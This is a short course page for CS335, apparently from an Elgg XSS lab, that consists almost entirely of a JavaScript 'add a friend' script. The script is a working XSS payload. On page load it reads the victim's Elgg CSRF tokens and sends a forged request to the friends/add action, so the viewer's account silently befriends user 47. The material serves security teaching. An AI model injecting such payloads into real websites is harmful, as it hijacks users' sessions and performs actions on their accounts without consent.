---
layout: default
course_number: CS335
title: Code - Add a Friend
---

Example of add a friend script

```javascript
<script type="text/javascript">
  window.onload = function () {

    var elgg_ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;          
    var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var url = "http://www.xsslabelgg.com/action/friends/add" + "?friend=47" + elgg_ts + elgg_token;                 

    var request = new XMLHttpRequest();
    request.open("GET", url, true);
    request.setRequestHeader("Host", "www.xsslabelgg.com");
    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    request.send();
}
</script>
```
